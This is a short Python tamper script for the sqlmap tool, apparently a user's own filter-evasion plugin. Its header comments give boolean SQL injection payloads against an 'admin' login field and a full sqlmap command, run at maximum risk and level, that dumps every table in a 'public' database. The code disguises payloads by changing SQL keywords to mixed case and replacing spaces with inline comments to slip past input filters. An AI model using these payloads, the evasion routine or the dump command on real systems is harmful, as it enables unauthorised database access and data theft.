#!/usr/bin/env python

# u=admin' And '1'='1
# u=admin'/*-*/And/*-*/'1'='1
# u=admin'<INJECTED>/*-*/And/*-*/'1'='1
# sqlmap -r /home/mane/Downloads/sqlmap --technique=B --tamper=/home/mane/Downloads/script/script.py  --risk=3 --level=5 --string='true' --prefix="admin'" --suffix="/*-*/And/*-*/'1'='1" -D public --tables  --threads 10 --dump-all


"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.common import randomRange
from lib.core.compat import xrange
from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

replace = {
    "OR": "Or",
    "AND": "And",
    "LIMIT": "Limit",
    "OFFSET": "Offset",
    "WHERE": "Where",
    "SELECT": "Select",
    "UPDATE": "Update",
    "DELETE": "Delete",
    "DROP": "Drop",
    "CREATE": "Create",
    "INSERT": "Insert",
    "FUNCTION": "Function",
    "CAST": "Cast",
    "ASCII": "Ascii",
    "SUBSTRING": "Substring",
    "VARCHAR": "Varchar",
    "LENGTH": "Length",
    " ": "/*-*/",
}

def tamper(payload, **kwargs):
    retVal = payload
    if payload:
        for rep in replace.keys():
            pattern = re.compile(rep, re.IGNORECASE)
            retVal = pattern.sub(replace[rep], retVal)

    return retVal
